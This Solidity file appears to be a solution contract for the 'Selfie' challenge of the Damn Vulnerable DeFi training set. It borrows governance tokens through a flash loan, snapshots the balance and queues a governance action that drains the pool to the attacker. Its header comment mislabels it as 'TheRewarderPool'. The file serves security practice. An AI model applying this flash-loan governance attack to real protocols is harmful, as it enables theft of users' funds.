// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
 * @title TheRewarderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 */
contract EvilContractSelfie {
    using Address for address;
    address payable owner;
    SelfiePool immutable pool;
    DamnValuableTokenSnapshot public immutable token;
    SimpleGovernance immutable governance;

    constructor(
        address _pool,
        address _token,
        address _gov
    ) {
        owner = payable(msg.sender);
        pool = SelfiePool(_pool);
        token = DamnValuableTokenSnapshot(_token);
        governance = SimpleGovernance(_gov);
    }

    function attack(uint256 amt) public {
        require(msg.sender == owner, "Forbidden");
        pool.flashLoan(amt);
    }

    function receiveTokens(address tokenAddr, uint256 amount) public payable {
        _useLoan();
        DamnValuableTokenSnapshot(tokenAddr).transfer(msg.sender, amount);
    }

    function _useLoan() private {
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );
        token.snapshot(); // take a snapshot of the balance of this contract to allow vote to pass
        governance.queueAction(address(pool), data, 0);
    }
}
